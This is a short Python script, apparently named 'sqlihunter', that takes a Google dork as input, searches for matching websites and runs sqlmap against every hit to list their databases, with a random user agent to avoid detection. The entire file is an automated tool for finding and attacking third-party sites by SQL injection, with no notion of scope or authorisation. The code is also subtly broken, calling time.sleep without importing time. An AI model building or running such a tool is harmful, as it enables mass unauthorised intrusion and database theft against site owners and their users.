import os
import colorama
from subprocess import call
from colorama import Fore, Style
import datetime
from googlesearch import search, get_tbs

colorama.init(autoreset=True)

print(Fore.LIGHTGREEN_EX +""" 
========================================
           _ _ _                 _            
          | (_) |               | |           
 ___  __ _| |_| |__  _   _ _ __ | |_ ___ _ __ 
/ __|/ _` | | | '_ \| | | | '_ \| __/ _ \ '__|
\__ \ (_| | | | | | | |_| | | | | ||  __/ |   
|___/\__, |_|_|_| |_|\__,_|_| |_|\__\___|_|   
        | |                                   
        |_|                                   
""")

def sqlih():
   dork = input(f'{Fore.GREEN}dork => {Fore.WHITE}')

   for i in search(
    dork,
    tld="com", 
    num=1, 
    pause=1,
    tbs=get_tbs(
        datetime.date(2021, 1, 1),
        datetime.date(2022, 4, 1))
   ):
    time.sleep(4.0)
    print(Fore.YELLOW+"HUNTING... PLEASE WAIT!")
    print(Fore.GREEN +"[:] DORK INSERTED: " + dork, '\n' + Fore.RED +"[!] WEBSITE FOUND: " + i)
    time.sleep(10.0)
    call(["sqlmap", i ,"--dbs", "--random-agent"])
